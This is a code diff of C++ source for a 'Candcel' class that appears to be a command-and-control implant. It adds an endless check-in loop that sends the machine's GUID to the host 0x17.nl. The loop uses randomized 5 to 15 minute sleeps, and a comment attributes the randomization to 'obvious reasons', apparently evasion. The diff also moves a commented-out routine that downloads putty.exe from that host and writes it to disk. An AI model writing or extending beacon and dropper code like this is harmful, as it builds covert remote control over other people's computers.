@@ -22,34 +22,39 @@ void Candcel::isAlive()
 }
 
 
-void Candcel::CheckIn()
+DWORD Candcel::CheckIn()
 {
-	Log::Instance()->write(L"Candcel", L"Sending checkin request");
+	if (!serverSolicitAck) {
+		return 1;
+	}
 
-	RestClient rc("0x17.nl", "avc_endpoint.php");
+	while (true) {
+		int nextInterval = (rand() % (10 + 1)) + 5;
 
-	JSONObject obj;
-	obj[L"data"] = new JSONValue;
-	obj[L"code"] = new JSONValue(static_cast<double>(101));
-	obj[L"success"] = new JSONValue(true);
+		Log::Instance()->write(L"Candcel", L"Sending checkin request, then after " + std::to_wstring(nextInterval) + L" minutes");
 
-	char *rs = rc.Perform(L"data=" + JSONValue(obj).Stringify());
+		RestClient rc("0x17.nl", "avc_endpoint.php");
 
-	Log::Instance()->write(L"Candcel", "Data => " + std::string(rs));
-	delete rs;
+		JSONObject obj;
+		obj[L"guid"] = new JSONValue(Config::Guid());
 
-	/*WebClient wc("0x17.nl", "putty.exe");
-	char *data = wc.Perform("");
+		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
 
-	std::ofstream outfile("putty.exe", std::ofstream::binary);
-	outfile.write(data, wc.getResponseSize());
-	outfile.close();
-	delete data;*/
+		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
+			Log::Instance()->write(L"Candcel", "Request failed");
+		}
+
+		/* Randomize the interval for obvious reasons */
+		Sleep(nextInterval * 60 * 1000);
+	}
+
+	return 0;
 }
+
 
 void Candcel::Solicit()
 {
-	Log::Instance()->write(L"Candcel", L"Notify the server");
+	Log::Instance()->write(L"Candcel", L"Notify the server of this instance");
 
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -62,7 +67,27 @@ void Candcel::Solicit()
 
 	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));
 
-	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
-		Log::Instance()->write(L"Candcel", "Server did not respond");
+	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
+		Log::Instance()->write(L"Candcel", "Request failed");
 	}
+
+	serverSolicitAck = true;
+}
+
+
+void Candcel::Update()
+{
+	if (!serverSolicitAck) {
+		return;
+	}
+
+	/*Log::Instance()->write(L"Candcel", L"Sending update request");
+
+	WebClient wc("0x17.nl", "putty.exe");
+	char *data = wc.Perform("");
+
+	std::ofstream outfile("putty.exe", std::ofstream::binary);
+	outfile.write(data, wc.getResponseSize());
+	outfile.close();
+	delete data;*/
 }
